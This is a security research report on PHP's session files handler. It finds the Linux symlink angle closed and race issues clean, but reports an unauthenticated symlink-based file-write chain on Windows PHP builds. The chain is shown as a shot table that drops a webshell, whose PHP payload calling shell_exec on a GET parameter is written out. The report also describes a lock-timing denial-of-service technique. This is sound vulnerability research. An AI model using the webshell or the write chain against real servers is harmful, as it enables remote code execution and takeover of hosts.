# Finding C pass 3 — Target 1: RCE CONFIRMED on Windows PHP; Linux symlink angle DEAD; Targets 2/3 raced clean

Verdict: **the truncate-through-symlink escalation is real, but on ZEND_WIN32 PHP, not
Linux.** On Windows builds the session files handler has *no* symlink protection
(`O_NOFOLLOW` is `#define`d to `0` under `PHP_WIN32`, mod_files.c:85-90) *and* the
uid-ownership check is compiled out (`#ifndef PHP_WIN32`, mod_files.c:194-207).
Combined with Finding C's unauth upload-progress trigger this yields an **unauth
arbitrary-path file-create/write primitive** — receipted end-to-end as a webshell drop
and command execution on stock windows.php.net builds of **PHP 8.5.12 and 8.1.34**
(`wp3/receipts/win/`). On Linux (Ubuntu 8.1.2-1ubuntu2.27 shipped binary + 8.5.12
plain/ASAN) the symlink angle is receipt-closed: real `O_NOFOLLOW`, `ELOOP`, no wipe,
no unlink, target intact. Targets 2 and 3 were raced live under ASAN (stale-inode /
partial-decode storm + flock-synchronizer): **zero ASAN reports, zero stale/torn
decodes**; the flock window is confirmed as an attacker-timed blocking primitive
(DoS/lockout) only.

## 1. Target 1 — Linux: symlink-follow DEAD (receipts)

- Ground truth, shipped Ubuntu binary `/usr/bin/php8.1` (8.1.2-1ubuntu2.27), plus
  `/tmp/php8512_build/plain2` and `asan2` (8.5.12): every session open is
  `openat(AT_FDCWD, ".../sess_<sid>", O_RDWR|O_CREAT|O_NOFOLLOW, 0600)`; with
  `sess_<sid>` a symlink the open fails `-1 ELOOP` (`receipts/linux/nofollow/*/symlink_read.strace`).
- Live reject-path HTTP shot (pipe poison key) at a symlinked sid on the ASAN 8.5.12
  CLI server: `open(...) failed: Too many levels of symbolic links (40)` +
  `Failed to read session data` — the session never becomes active, **no rfc1867
  update runs at all: no ftruncate, no pwrite, no unlink**. Target file 59/59 bytes,
  symlink still present. Control shot on a regular sess file: wiped to 0
  (`receipts/linux/server_err.log`, `client*.log`).
- The php-src commit of Oct 13 2026 ("remove dead !O_NOFOLLOW fallback") only removed
  the `#else` branch of `#ifdef O_NOFOLLOW` — dead code on glibc platforms where
  O_NOFOLLOW is always defined. It changed no Linux behavior, on any branch, ever.
- DELETE escalation through a symlink: unreachable on Linux — `PS_DESTROY_FUNC(files)`
  requires `data->fd != -1`, and the fd can never be obtained through a symlink. On a
  regular file the destroy unlinks normally (control receipt).
- Conclusion: on Linux the wipe/delete blast radius stays confined to regular
  `sess_<[A-Za-z0-9,-]+>` files owned by the web uid under save_path. No file-zeroing
  upgrade beyond pass 2.

## 2. Target 1 — Windows: create/write/zero through symlinks, unauth RCE chain

Structural source facts (php-8.5.12 tarball, unchanged in 8.1):
- `ext/session/mod_files.c:85-90`: `#ifdef PHP_WIN32 / #ifndef O_NOFOLLOW /
  #define O_NOFOLLOW 0` — the "O_NOFOLLOW to prevent us from following evil symlinks"
  open (mod_files.c:180-183) passes flag **0** on Windows. No protection.
- `mod_files.c:194-207`: the "Session data file is not created by your uid" check is
  wrapped in `#ifndef PHP_WIN32` — **no ownership check on Windows** (any file the
  app-pool identity can open O_RDWR is reachable, regardless of owner).
- ZTS Windows builds (the official releases) define `VIRTUAL_DIR` (zend_virtual_cwd.h:52),
  so `VCWD_OPEN_MODE` → `virtual_open` (path expansion WITHOUT reparse resolution →
  the underlying `php_win32_ioutil_open`/CreateFileW **follows** the symlink), while
  `VCWD_UNLINK` → `virtual_unlink(..., CWD_EXPAND)` does NOT resolve reparse points →
  deletes only the link (zend_virtual_cwd.c:1581-1598, 566-700).

Lab (both `winphp/8512` and `winphp/8134`, ZTS, stock zips from windows.php.net,
`php.exe -S`, ini: default handler `php`, `use_strict_mode=0`, upload_progress default-on;
attacker = one unauth multipart POST with `PHP_SESSION_UPLOAD_PROGRESS` and a cookie
sid of their choosing; symlink planted in save_path):

| Shot | Setup | Result (8.5.12 AND 8.1.34) |
|---|---|---|
| W1 | regular sess file + pipe key (control) | sess wiped to 0 (Finding C parity on Windows) |
| W2 | symlink -> pipe-garbage target | decode fails -> destroy **unlinks the LINK only**, target intact |
| W3 | symlink -> target whose whole content is a valid php session + pipe key | **TARGET TRUNCATED TO 0 through the symlink** (file-zeroing primitive; works on any file the identity can open, any path) |
| W4 | symlink -> valid-session target + clean key | target transiently overwritten during upload, restored at FILE_END (lazy_write + cleanup cycle); final bytes == original |
| W5 | DANGLING symlink -> nonexistent target + pipe key | **target file CREATED (0 bytes) at arbitrary path** through O_CREAT-follows-link |
| W6 | DANGLING symlink -> docroot/shell.php + payload key + `cleanup=0` | **457-byte webshell written**: `upload_progress_<?php echo "WP3_RCE_OK[".shell_exec($_GET["c"])."]"; ?>\|a:5:{...}` |
| W7 | `GET /shell.php?c=whoami` | **`WP3_RCE_OK[andre]`** — command execution; also `echo WP3_PWNED`, `hostname` -> `Rasputin` |

Receipts: `wp3/receipts/win/{8512,8134}_matrix.log`, `{8512,8134}_dropped_shell.php`,
`server_err.log`, per-shot client logs. Chain driver: `wp3/wp3_win_lab.sh`.

Constraints that bound the primitives (all receipted):
- **Zero** (W3) requires the target's entire content to decode under the site's
  active serialize_handler (php: whole file must be `name\|serialized;` pairs).
  Anything else (any normal config/php file) decode-fails -> the destroy path removes
  the symlink only (W2) and the target survives.
- **Write** (W6) requires a pipe-free progress key (a `|` flips the encode to the
  reject → wipe instead of write) and content persistence via `cleanup=0` or an
  aborted upload (pass-2 addendum C: the early updates commit and are never rolled
  back — on streaming SAPIs (Apache/FastCGI) the abort variant works with default
  cleanup=1; the php -S lab buffers bodies, hence cleanup=0 there).
- The written content is a well-formed session: `upload_progress_<attacker bytes>` +
  serialized progress array (attacker controls the key bytes, the filename, field
  names). Any `.php` target with an attacker `<?php ... ?>` island in the key executes.
- Preconditions: a symlink (or dangling symlink) named `sess_<[A-Za-z0-9,-]+>` in
  save_path, planted by whoever can write there (NTFS symlinks need
  SeCreateSymbolicLink privilege: admin/dev-mode tenant, or any co-tenant compromise
  of a shared save_path such as C:\Windows\Temp). The HTTP trigger is unauth.
- SAPI independence: the rfc1867 callback + mod_files I/O are RINIT/main-code, not
  SAPI-specific; the lab used the CLI server only as the vehicle. Streaming SAPIs
  widen the transient windows (W4) and enable the abort-persistence variant.

## 3. Target 2 — stale-inode / partial-decode race: CLOSED CLEAN (live storm, ASAN)

Lab (`wp3/wp3_race_lab.sh`, receipts `wp3/receipts/race/race_logs/`): php_binary
handler, 5MB tmpfs holding save_path + upload_tmp_dir, 2.1MB php_binary victim,
6 parallel ASAN reader loops (~36,000 read+decode+write cycles), attacker requests
whose file parts carry a 3MB FILENAME (php_binary encoder *skips* keys > PS_BIN_MAX,
but the progress `name` value grows the session) → per round: read victim → insert →
encode ~5.2MB → `ftruncate` frees the old file → `pwrite` hits ENOSPC mid-write
("Write wrote less bytes than requested" receipt in server_err.log) → corrupt prefix
file → next update/reader decode-fails ("Failed to decode session object. Session has
been destroyed", 18 reader-side + 1 per round server-side) → `php_session_destroy` →
close → **UNLINK mid-race** → next open(O_CREAT) recreates a fresh inode (7 distinct
inodes observed; watcher + strace).

- **0 ASAN reports** across all processes.
- **0 stale/torn decodes**: every BIG-DECODE line had `disk_size == decoded` — readers
  that held the old inode always decoded a self-consistent snapshot of it.
- Strace receipt (`t2_r1.strace:204-210`), the exact interleaving the task asked about:
  `pread64(4, "victim_0...", 5234688, 0) = 5234688` (complete read of the 5.2MB
  truncated stream) → `close(4)` (lock release) → `unlink(...) = 0` →
  `openat(..., O_RDWR|O_CREAT|O_NOFOLLOW) = 4` (fresh inode) → `newfstatat` st_size=0 →
  `flock(LOCK_EX)`. The lock is released *before* the unlink, so a waiter can lock the
  old inode in the ~100µs window — but it then reads a consistent old-inode snapshot
  (or its decode fails cleanly via cancel_decode). No crossing of new-path data onto
  an old-inode read ever occurred.
- Why torn reads are unreachable (source + receipts): `ps_files_open` takes LOCK_EX
  and the fd is held through fstat→pread→decode→encode→write (close happens only in
  `php_session_save_current_state` → `PS_CLOSE_FUNC` at the end of each rfc1867
  update), and `PS_READ_FUNC` rejects short preads before any decode
  (`n != sbuf.st_size` → "Read returned less bytes than requested" → FAILURE; zero
  occurrences in the whole storm). Pass-2's static decode matrix (69 files x 3
  handlers) plus this live interleaved storm closes the partial-decode surface.

## 4. Target 3 — flock window as synchronizer: CONFIRMED primitive, no memory angle

Unauth attacker controls how long a victim `session_start` (any worker touching the
same sid) blocks at `flock(LOCK_EX)`, by sizing the upload-progress data (filename
bytes / key length), which sizes each update's decode+encode work done under the lock:

- control (no attacker): max reader flock wait **0.22 ms**
- attacker filename 512KB: max flock wait **9.7 ms**
- attacker filename 2MB: max flock wait **36.5 ms**
- storm peaks (2.1MB victim + 3MB filename under ASAN+strace): **294 / 412 / 722 ms**

Monotonic, attacker-chosen magnitude → an unauth remote can hold a named victim
session hostage (login/lockout DoS) and time-lock concurrent workers around the
reject path's syscalls. All ASAN-clean. (Slow-drip rate control is moot on php -S,
which buffers bodies and fires all rfc1867 updates in a burst at request end; the
size knob is the effective one, and it transfers to streaming SAPIs.)

## 5. Fleet context (ties to pass-2 + playbook)

- Ubuntu jammy 8.1.2-1ubuntu2.27 never shipped the Oct-2026 patch (playbook item 11);
  the reject path there is additionally SILENT (pass-2 addendum A). The Windows
  structural gap (O_NOFOLLOW=0 + no uid check) is ancient and version-independent —
  every Windows PHP build is exposed, independent of the 2026 patch state.
- Finding C class upgrade on Windows: unauth session-file wipe (DoS) → unauth
  arbitrary-path file create/write (RCE with a webroot target). The Linux class stays
  as pass-2 closed it.

## 6. Not covered / next

- Windows: no IIS/FastCGI end-to-end (chain proven on the CLI server; rfc1867 +
  mod_files are SAPI-independent; abort-persistence on streaming SAPIs asserted from
  pass-2 addendum C, not re-receipted on Windows).
- Windows: cross-owner zero/write (no ownership check, source-verified
  `#ifndef PHP_WIN32`) not receipted with a second principal — same-user lab only.
- Junctions instead of symlinks: junction targets must be directories → open(O_RDWR)
  fails; not a file-write vector.
- The W4 transient overwrite window on a streaming SAPI (observable cross-request
  corruption of a decodable victim file) — php -S buffering hides it; would need the
  Apache lab.
- Target 2 exotic interleavings beyond the flock discipline (e.g., fd-passing via
  prefork reuse) — not applicable to the CLI/ASAN lab shape.

## 7. File map

- `wp3/wp3_win_lab.sh` — Windows matrix + RCE chain driver (host git-bash)
- `wp3/wp3_nofollow_linux.sh`, `wp3/wp3_probe.php` — Linux O_NOFOLLOW ground truth
- `wp3/wp3_linux_symtest.sh` — Linux reject-path-through-symlink shot + control
- `wp3/wp3_race_lab.sh`, `wp3/wp3_race_reader.php`, `wp3/wp3_gen_victim.php`,
  `wp3/wp3_upclient.py` (adds `--filename-bytes`) — Targets 2/3 race lab
- `wp3/receipts/win/` — Windows matrix logs, dropped shells, server logs
- `wp3/receipts/linux/` — symtest logs + nofollow strace set (php81/plain85/asan85)
- `wp3/receipts/race/race_logs/` — T2/T3 strace, reader logs, watcher, server logs
- `wp3/winphp/{8512,8134}/` — stock Windows PHP builds used
